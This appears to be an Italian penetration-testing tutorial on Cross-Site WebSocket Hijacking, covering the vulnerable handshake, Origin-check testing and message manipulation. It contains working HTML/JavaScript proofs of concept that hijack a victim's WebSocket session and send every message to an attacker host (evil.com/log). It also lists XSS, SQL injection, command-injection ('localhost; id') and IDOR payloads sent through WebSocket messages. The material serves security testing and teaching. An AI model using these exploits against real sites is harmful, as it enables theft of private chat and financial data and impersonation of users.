---
title: >-
  WebSocket Hijacking (CSWSH): Cross-Site WebSocket Hijacking e Data Theft
  Real-Time
slug: websocket-hijacking
description: >-
  WebSocket Hijacking spiegato: CSWSH, handshake vulnerabile, Origin check
  mancante e furto dati real-time da chat, notifiche e dashboard.
image: /websocket-hijacking.webp
draft: false
date: 2026-03-20T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - api
---

# Cos'è Il WebSocket Hijacking?

I **WebSocket** sono connessioni persistenti e bidirezionali tra browser e server. A differenza delle normali request HTTP (il client chiede, il server risponde, la connessione si chiude), un WebSocket resta aperto: il server può inviare dati al client in qualsiasi momento — chat in tempo reale, notifiche, aggiornamenti di dashboard, trading live, giochi online.

Il **WebSocket Hijacking** (o CSWSH — Cross-Site WebSocket Hijacking) si verifica quando un attaccante riesce a stabilire una connessione WebSocket verso l'applicazione target usando i cookie della vittima. Il meccanismo è simile al [CSRF](https://hackita.it/articoli/csrf): la vittima visita `evil.com`, JavaScript apre un WebSocket verso `target.com`, il browser include i cookie automaticamente, e il server accetta la connessione perché la sessione è valida. Da quel momento, l'attaccante riceve tutto il flusso dati in tempo reale — messaggi di chat, transazioni, notifiche — e può inviare messaggi come se fosse la vittima.

Satellite della [guida pillar API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa). Vedi anche: [CORS Misconfiguration](https://hackita.it/articoli/cors-misconfiguration), [CSRF](https://hackita.it/articoli/csrf).

Riferimenti: [PortSwigger WebSocket](https://portswigger.net/web-security/websockets), [OWASP WebSocket Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets), [HackTricks WebSocket](https://book.hacktricks.wiki/en/pentesting-web/cross-site-websocket-hijacking-cswsh.html).

***

## Come Funziona — Il Handshake Vulnerabile

```
# Il WebSocket inizia con un HTTP Upgrade:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Cookie: session=VICTIM_COOKIE     ← il browser lo include automaticamente!
Origin: https://evil.com          ← il server controlla l'Origin? Spesso no.

# Se il server NON verifica l'Origin → accetta la connessione da evil.com
# Da quel momento: connessione bidirezionale autenticata come la vittima
```

La differenza chiave con CORS: per le request HTTP normali, il browser applica la Same-Origin Policy e blocca la **lettura** delle risposte cross-origin (a meno di CORS permissivo). Per i WebSocket, **non esiste Same-Origin Policy**. Qualsiasi pagina può aprire un WebSocket verso qualsiasi dominio. L'unica protezione è che il server verifichi l'header `Origin` nel handshake — e molti non lo fanno.

***

## Detection — Verificare Se Il WebSocket È Vulnerabile

### Step 1: Trova I WebSocket

```bash
# In Burp: WebSockets history → mostra tutte le connessioni ws://
# Nel browser: DevTools → Network → filtra "WS"
# Nel codice JS: cerca "new WebSocket(" o "io.connect(" (Socket.IO)

# URL tipici:
wss://target.com/ws
wss://target.com/chat
wss://target.com/socket.io/?transport=websocket
wss://target.com/realtime
wss://api.target.com/v2/stream
```

### Step 2: Verifica Origin Check

```bash
# In Burp: intercetta il handshake WebSocket
# Modifica l'header Origin:
Origin: https://evil.com

# Se la connessione è accettata (101 Switching Protocols) → nessun Origin check
# → CSWSH possibile!

# Oppure da command line:
# websocat (https://github.com/vi/websocat):
websocat -H "Origin: https://evil.com" -H "Cookie: session=VALID" \
  "wss://target.com/ws"
# Se si connette → vulnerabile
```

### Step 3: Verifica Autenticazione

```bash
# Il WebSocket richiede autenticazione?
# Prova a connetterti SENZA cookie:
websocat "wss://target.com/ws"

# Se si connette e ricevi dati → nessuna autenticazione!
# Peggio ancora: chiunque può connettersi e leggere tutto
```

***

## Exploitation — Cross-Site WebSocket Hijacking

### PoC Base — Leggi Dati Real-Time

```html
<!-- evil.com/ws-steal.html -->
<script>
// Apri WebSocket verso target.com — il browser include i cookie!
var ws = new WebSocket("wss://target.com/ws");

ws.onopen = function() {
  console.log("[+] Connected as victim!");
  // Opzionale: invia un messaggio per richiedere dati
  ws.send(JSON.stringify({action: "get_profile"}));
  ws.send(JSON.stringify({action: "get_messages"}));
};

ws.onmessage = function(event) {
  console.log("[+] Data received:", event.data);
  // Invia al server dell'attaccante
  fetch("https://evil.com/log", {
    method: "POST",
    body: event.data
  });
};
</script>
```

### PoC Chat — Leggi E Invia Messaggi Come La Vittima

```html
<script>
var ws = new WebSocket("wss://target.com/chat");

ws.onopen = function() {
  // Leggi lo storico messaggi
  ws.send(JSON.stringify({type: "fetch_history", channel: "general"}));
  
  // Invia un messaggio come la vittima
  ws.send(JSON.stringify({
    type: "message",
    channel: "general",
    text: "Messaggio inviato dall'attaccante come se fosse la vittima"
  }));
};

ws.onmessage = function(e) {
  // Ogni messaggio in tempo reale → inviato all'attaccante
  fetch("https://evil.com/log", {method:"POST", body:e.data});
};
</script>
```

***

## WebSocket Message Manipulation In Burp

Anche senza CSWSH, i messaggi WebSocket possono essere manipolati direttamente:

```bash
# In Burp: Proxy → WebSockets history
# Click destro su un messaggio → "Send to Repeater"
# Modifica il messaggio e invialo

# === Injection nei messaggi ===

# Se i messaggi vengono visualizzati in HTML (chat):
{"message": "<img src=x onerror=alert(1)>"}
# → XSS stored via WebSocket!

# Se i messaggi finiscono in un database:
{"message": "test' OR '1'='1"}
# → SQL injection via WebSocket

# Se il messaggio contiene un ID utente:
{"action": "get_profile", "user_id": 1338}
# → IDOR via WebSocket (cambia user_id per leggere dati di altri)

# Command injection:
{"action": "ping", "host": "localhost; id"}
```

### Autenticazione Post-Handshake

```bash
# Alcuni WebSocket richiedono un token DOPO la connessione:
# Connessione → il server chiede: {"type":"auth","token":"?"}
# Il client invia: {"type":"auth","token":"JWT_HERE"}

# Test: cosa succede se NON invii il token?
# → Ricevi comunque i dati? → Autenticazione mancante!

# Test: cosa succede se invii un token scaduto/invalido?
# → Il server ti disconnette? O continui a ricevere dati?
```

***

## Output Reale

### CSWSH Confermato

```bash
# Handshake con Origin malevolo:
$ websocat -H "Origin: https://evil.com" -H "Cookie: session=abc123" \
  "wss://target.com/realtime"

# Output (dati che arrivano in tempo reale):
{"type":"notification","data":{"text":"Nuovo ordine #4523 - €2,350.00"}}
{"type":"notification","data":{"text":"Pagamento ricevuto - IBAN IT60X054..."}}
{"type":"user_update","data":{"email":"admin@company.com","last_login":"2026-02-25T14:30:00Z"}}

# → Notifiche real-time dell'admin — ordini, pagamenti, IBAN — catturate da evil.com!
```

### IDOR Via WebSocket

```bash
# Messaggio legittimo:
{"action": "get_orders", "user_id": 1337}
# → I tuoi ordini

# Messaggio modificato in Burp:
{"action": "get_orders", "user_id": 1}
# → Ordini dell'admin!

{"action": "get_orders", "user_id": 1338}
# → Ordini di un altro utente!
```

***

## Workflow Operativo

### Step 1 → Mappa i WebSocket

In Burp o DevTools: identifica ogni connessione WebSocket, il path, e il tipo di dati che transita.

### Step 2 → Origin check

Modifica `Origin` nel handshake a `https://evil.com`. Se 101 → nessun check → CSWSH.

### Step 3 → Se CSWSH → PoC

Crea la pagina HTML con `new WebSocket()` + `credentials: include`. Documenta i dati ricevuti.

### Step 4 → Message manipulation

In Burp Repeater: modifica i messaggi. Testa injection (XSS, SQLi), IDOR (cambia user\_id), e comandi non autorizzati.

### Step 5 → Autenticazione

Il WebSocket richiede auth? Cosa succede senza token? Con token scaduto?

***

## Enterprise Escalation

### CSWSH → Trading Platform → Market Manipulation

```
WebSocket su piattaforma trading → nessun Origin check
→ evil.com apre WS come vittima (trader)
→ Legge posizioni aperte e ordini pendenti in tempo reale
→ Invia ordini di vendita/acquisto come il trader
→ MARKET MANIPULATION / FINANCIAL FRAUD
```

### CSWSH + XSS Via WS → Chat Worm

```
CSWSH → connessione alla chat aziendale come vittima
→ Invia messaggio con XSS payload nel canale #general
→ Ogni dipendente che legge → XSS si attiva → apre nuovo WS
→ Propagazione esponenziale → TUTTI i messaggi di TUTTI gli utenti
→ CORPORATE ESPIONAGE
```

***

## Caso Studio

**Settore:** Piattaforma di project management con chat integrata, 15.000 utenti.

Il WebSocket `wss://app.target.com/realtime` gestiva notifiche, chat, e aggiornamenti di progetto. Il handshake non verificava l'Origin — accettava qualsiasi dominio. PoC: pagina HTML su un dominio esterno → connessione WebSocket con il cookie della vittima → ricezione di tutte le notifiche in tempo reale (nuovi task, menzioni, messaggi privati).

Il canale chat permetteva di inviare messaggi come la vittima. Il campo `text` del messaggio non era sanitizzato → XSS stored: ogni utente che leggeva il messaggio nella chat eseguiva il JavaScript dell'attaccante.

**Un WebSocket senza Origin check + un campo non sanitizzato = accesso a tutte le conversazioni aziendali.**

***

## ✅ Checklist WebSocket Hijacking

```
DISCOVERY
☐ WebSocket endpoints identificati (wss://, ws://)
☐ Tipo di dati: chat, notifiche, trading, dashboard?
☐ Socket.IO o WebSocket nativo?

CSWSH
☐ Origin: https://evil.com nel handshake → accettato?
☐ Se accettato → PoC HTML con new WebSocket() creato
☐ Cookie incluso automaticamente nel handshake?
☐ Dati ricevuti cross-origin documentati

AUTENTICAZIONE
☐ Connessione senza cookie → funziona?
☐ Auth post-handshake: cosa succede senza token?
☐ Token scaduto → disconnessione o accesso continuo?

MESSAGE MANIPULATION
☐ IDOR: cambia user_id/channel_id → dati di altri?
☐ XSS: HTML/JS nel messaggio → eseguito?
☐ SQLi: ' e payload SQL nel messaggio → errore DB?
☐ Comandi non autorizzati (admin actions via WS)?

IMPATTO
☐ Dati sensibili transitano via WebSocket? (chat, ordini, transazioni)
☐ Messaggi inviabili come la vittima?
☐ Azioni eseguibili via WS? (ordini, trasferimenti, modifiche)
```

***

Riferimenti: [PortSwigger WebSocket vulnerabilities](https://portswigger.net/web-security/websockets), [OWASP WebSocket Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets), [HackTricks WebSocket Hijacking](https://book.hacktricks.wiki/en/pentesting-web/cross-site-websocket-hijacking-cswsh.html).

Satellite della [Guida API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa). Vedi anche: [CORS Misconfiguration](https://hackita.it/articoli/cors-misconfiguration), [CSRF](https://hackita.it/articoli/csrf), [XSS](https://hackita.it/articoli/xss).

> I tuoi WebSocket verificano l'Origin? La chat è sanitizzata? Le notifiche sono leggibili cross-site? [Penetration test HackIta](https://hackita.it/servizi) per ogni falla WebSocket. Dal hijacking al data theft real-time: [formazione 1:1](https://hackita.it/formazione).
